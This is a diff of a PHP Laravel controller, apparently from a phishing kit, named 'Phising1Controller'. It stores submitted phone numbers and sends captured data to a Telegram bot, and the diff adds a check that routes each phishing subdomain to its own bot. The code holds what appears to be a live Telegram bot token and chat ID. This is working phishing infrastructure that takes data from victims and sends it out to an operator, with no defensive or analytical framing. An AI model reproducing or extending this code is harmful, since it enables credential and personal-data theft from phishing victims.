@@ -10,6 +10,8 @@ class Phising1Controller extends Controller
     {
         return inertia('Phising1/Index');
     }
+
+
     public function store_number(Request $request)
     {
         $request->validate([
@@ -54,12 +56,13 @@ class Phising1Controller extends Controller
     {
 
 
-        // if ($subdomain == "live-vc-private1-my6") {
-        // BOT 6
-        $bot_token = "7724085428:AAH8nxi8ZObEylt751zwZbWdEc8_7HwZESc";
-        $chat_id = "7935306179";
-        $phisData = "MY6";
-        // }
+        if ($subdomain == "live-vc-private1-my6") {
+            // BOT 6
+            $bot_token = "7724085428:AAH8nxi8ZObEylt751zwZbWdEc8_7HwZESc";
+            $chat_id = "7935306179";
+            $phisData = "MY6";
+        } else {
+        }
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
 
